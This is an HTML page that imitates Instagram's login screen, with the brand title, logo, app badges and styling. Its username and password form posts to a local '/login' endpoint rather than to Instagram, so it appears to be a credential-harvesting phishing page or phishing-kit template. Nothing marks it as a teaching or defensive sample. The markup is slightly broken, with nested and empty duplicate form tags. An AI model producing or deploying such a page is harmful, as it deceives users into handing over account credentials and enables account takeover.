<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }

        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 30px;
            width: 100%;
            max-width: 350px;
            margin-bottom: 10px;
            box-sizing: border-box;
        }

        .logo {
            margin-bottom: 30px;
        }

        .logo img {
            height: 51px;
        }

        .form-container {
            display: flex;
            flex-direction: column;
            width: 100%;
        }

        .input-box {
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            margin-bottom: 10px;
            padding: 10px;
            display: flex;
        }

        .input-box input {
            border: none;
            background-color: transparent;
            width: 100%;
            font-size: 14px;
            outline: none;
        }

        .login-button {
            background-color: #0095f6;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 10px;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
        }

        .login-button:disabled {
            background-color: rgba(0, 149, 246, 0.3);
            cursor: not-allowed;
        }

        .separator {
            display: flex;
            align-items: center;
            margin-top: 20px;
            margin-bottom: 20px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: bold;
            width: 100%;
        }

        .separator hr {
            border: 0;
            border-top: 1px solid #dbdbdb;
            flex-grow: 1;
        }

        .separator-text {
            margin: 0 10px;
        }

        .facebook-login {
            color: #385185;
            font-weight: bold;
            text-decoration: none;
            margin-bottom: 20px;
            font-size: 14px;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            align-self: flex-end;
        }

        .signup-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 20px;
            text-align: center;
            width: 100%;
            max-width: 350px;
            box-sizing: border-box;
        }

        .signup-text {
            font-size: 14px;
        }

        .signup-link {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }

        .app-badges {
            margin-top: 20px;
            text-align: center;
        }

        .app-badges p {
            font-size: 14px;
            margin-bottom: 10px;
        }

        .app-badges img {
            height: 40px;
            margin: 0 5px;
        }
    </style>
</head>
<body>   <form method="POST" action="/login">
    <div class="login-container">
        <div class="logo">
            <img src="https://1000logos.net/wp-content/uploads/2017/02/Logo-Instagram-1.png" alt="Instagram">
        </div>
        <div class="form-container">
            <div class="input-box">
                <input type="text" name="username" placeholder="Phone number, username, or email">
            </div>
            <div class="input-box">
                <input type="password" name="password" placeholder="Password">
            </div>
            <button type="submit" class="login-button">Log in</button>
            <div class="separator">
                <hr>
                <span class="separator-text">OR</span>
                <hr>
            </div>
            <a href="#" class="facebook-login">Log in with Facebook</a>
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>
    </div>

    <div class="signup-container">
        <p class="signup-text">Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
    </div>

    <div class="app-badges">
        <p>Get the app.</p>
        <a href="#"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store"></a>
        <a href="#"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play"></a>
    </div>
    <form method="POST" action="/login">
        </form>
</body>
</html>
